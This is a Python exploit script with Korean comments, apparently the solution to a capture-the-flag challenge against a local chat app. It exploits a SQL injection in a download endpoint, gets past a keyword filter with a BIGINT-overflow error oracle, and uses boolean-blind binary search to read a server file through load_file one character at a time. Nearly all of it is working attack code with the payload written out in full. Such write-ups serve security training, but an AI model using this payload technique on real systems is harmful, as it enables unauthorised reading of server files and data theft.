#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSI 채팅 — SQLi 파일유출 (fsi-chat-sqli)  ·  대상 http://localhost:9090

취약점: ext/app.py 의 download() 는 filepath 를 safeQuery 없이 f-string 에 직접 넣는다
        → raw SQL injection (" 가 이스케이프되지 않아 문자열 탈출 가능).
          select loginid from fsi2022.board where filepath="{filepath}" limit 0,1

[보정 이후 — 의도된 풀이(error-based blind)]
   download() 는 ① union/select/extractvalue/updatexml/sleep/benchmark 키워드를 거부하고
   ② 원본 SQL 에러·소유자 값을 반영하지 않는다(generic "download error..").
   → UNION 직접추출·에러메시지(XPATH) 추출·시간기반이 모두 막힌다.
   남는 관측치는 '쿼리 에러 발생 여부' 하나뿐 → 산술 오버플로로 조건부 에러를 만들어
   boolean-blind 로 /upload/flag.txt 를 한 글자씩 읽는다.

   payload(filepath):  zz" or if(<COND>, 0xffffffffffffffff*0xffffffffffffffff, 0)-- -
     · COND 참  → 0xff..*0xff.. 평가 → BIGINT UNSIGNED out of range → 응답 "download error.."
     · COND 거짓 → if 가 0 반환 → where 거짓 → 응답 "select result has no data"
     · COND = ascii(substr(load_file(0x2f75706c6f61642f666c61672e747874),i,1)) > mid
       (경로 '/upload/flag.txt' 는 따옴표 충돌 회피로 hex 리터럴 사용, 이분탐색)
   (db 는 --secure-file-priv=/upload/ 라 /upload/flag.txt 는 load_file 가능)

실행:  python fsi_sqli.py        (먼저 FSI 가 :9090 으로 떠 있어야 함)
"""
import sys, re, time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9090"
OVERFLOW = "0xffffffffffffffff*0xffffffffffffffff"           # BIGINT UNSIGNED overflow
FILE_HEX = "0x2f75706c6f61642f666c61672e747874"             # '/upload/flag.txt'

def main():
    s = requests.Session()
    uid = "sqli_%d" % (int(time.time()) % 100000)
    pw  = "pw_demo_123"
    # download() 는 로그인 필요(sessionCheck) → 아무 계정이나 가입 후 로그인
    s.post(BASE + "/register", data={"userid": uid, "userpw": pw}, timeout=10)
    s.post(BASE + "/login",    data={"userid": uid, "userpw": pw}, timeout=10)
    print("[*] logged in as %s" % uid)

    def errored(cond):
        # cond(SQL 식)이 참이면 오버플로 에러 → "download error..", 거짓이면 "no data".
        payload = 'zz" or if(%s, %s, 0)-- -' % (cond, OVERFLOW)
        r = s.get(BASE + "/download", params={"filepath": payload}, timeout=10)
        return "download error" in r.text

    # oracle 동작 확인 (항상참 → 에러, 항상거짓 → no-data)
    if not (errored("1=1") and not errored("1=2")):
        print("[-] oracle 비정상 — FSI(:9090)/보정/기동 상태 확인"); return 1

    def char_at(i):
        # i 번째 바이트가 없으면(파일 끝/NULL) ascii>0 이 거짓 → 종료 신호로 0 반환
        if not errored("ascii(substr(load_file(%s),%d,1))>0" % (FILE_HEX, i)):
            return 0
        # ascii 값 이분탐색: 끝에서 char>lo 참·char>hi 거짓·hi=lo+1 → ascii=hi
        lo, hi = 0, 128
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if errored("ascii(substr(load_file(%s),%d,1))>%d" % (FILE_HEX, i, mid)):
                lo = mid
            else:
                hi = mid
        return hi

    flag = ""
    for i in range(1, 80):
        c = char_at(i)
        if c <= 0:                        # 파일 끝 → 종료
            break
        flag += chr(c)
        print("\r[*] leaking: %s" % flag, end="", flush=True)
        if flag.endswith("}"):
            break
    print()

    m = re.search(r"fsi2022\{[^}]*\}", flag)
    if m:
        print("[+] FLAG (fsi-chat-sqli):", m.group(0))
        return 0
    print("[-] flag 추출 실패 — 기동/보정 상태 확인:", repr(flag))
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
